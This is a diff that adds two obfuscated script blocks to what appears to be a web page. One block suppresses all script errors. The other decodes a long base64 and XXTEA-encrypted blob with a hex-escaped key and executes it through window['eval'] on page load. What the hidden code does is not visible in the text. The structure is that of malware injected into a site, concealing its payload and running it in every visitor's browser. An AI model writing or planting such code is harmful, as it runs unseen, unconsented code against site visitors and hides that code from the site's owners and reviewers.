@@ -1,0 +1,39 @@
+<script>window.onerror=function(){return true;}</script>
+<script>
+/*Extreme*/
+window.defaultStatus="Íê³É";
+Status="utf8to16";
+function utf8to16(str){var out,i,len,c;var char2,char3;out=[];len=str.length;i=0;while(i<len){c=str.charCodeAt(i++);switch(c>>4)
+{case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:out[out.length]=str.charAt(i-1);break;case 12:case 13:char2=str.charCodeAt(i++);out[out.length]=String.fromCharCode(((c&0x1F)<<6)|(char2&0x3F));break;case 14:char2=str.charCodeAt(i++);char3=str.charCodeAt(i++);out[out.length]=String.fromCharCode(((c&0x0F)<<12)|((char2&0x3F)<<6)|((char3&0x3F)<<0));break;}}
+return out.join('');}
+var base64DecodeChars=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);
+function base64decode(str)
+{var c1,c2,c3,c4;var i,len,out;len=str.length;i=0;out = "";while(i<len)
+{do
+{c1=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c1==-1);if(c1==-1)
+break;do
+{c2=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c2==-1);if(c2==-1)
+break;out+=String.fromCharCode((c1<<2)|((c2&0x30)>>4));do
+{c3=str.charCodeAt(i++)&0xff;if(c3==61)
+return out;c3=base64DecodeChars[c3]}while(i<len&&c3==-1);if(c3==-1)
+break;out+=String.fromCharCode(((c2&0XF)<<4)|((c3&0x3C)>>2));do
+{c4=str.charCodeAt(i++)&0xff;if(c4==61)
+return out;c4=base64DecodeChars[c4]}while(i<len&&c4==-1);if(c4==-1)
+break;out+=String.fromCharCode(((c3&0x03)<<6)|c4)}
+return out}
+function long2str(v,w){var vl=v.length;var sl=v[vl-1]&0xffffffff;for(var i=0;i<vl;i++)
+{v[i]=String.fromCharCode(v[i]&0xff,v[i]>>>8&0xff,v[i]>>>16&0xff,v[i]>>>24&0xff);}
+if(w){return v.join('').substring(0,sl);}
+else{return v.join('');}}
+function str2long(s,w){var len=s.length;var v=[];for(var i=0;i<len;i+=4)
+{v[i>>2]=s.charCodeAt(i)|s.charCodeAt(i+1)<<8|s.charCodeAt(i+2)<<16|s.charCodeAt(i+3)<<24;}
+if(w){v[v.length]=len;}
+return v;}
+function xxtea_decrypt(str,key){if(str==""){return"";}
+var v=str2long(str,false);var k=str2long(key,false);var n=v.length-1;var z=v[n-1],y=v[0],delta=0x9E3779B9;var mx,e,q=Math.floor(6+52/(n+1)),sum=q*delta&0xffffffff;while(sum!=0){e=sum>>>2&3;for(var p=n;p>0;p--){z=v[p-1];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[p]=v[p]-mx&0xffffffff;}
+z=v[n];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[0]=v[0]-mx&0xffffffff;sum=sum-delta&0xffffffff;}
+return long2str(v,true);}
+t="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";
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0=4(5(3(0),\'\\2\\1\\6\\d\\7\'));c["\\b\\a\\8\\9"](0);',14,14,'t|x75|x66|base64decode|utf8to16|xxtea_decrypt|x63|x31|x61|x6c|x76|x65|window|x6b'.split('|'),0,{}))
+/*Extreme*/
+</script>
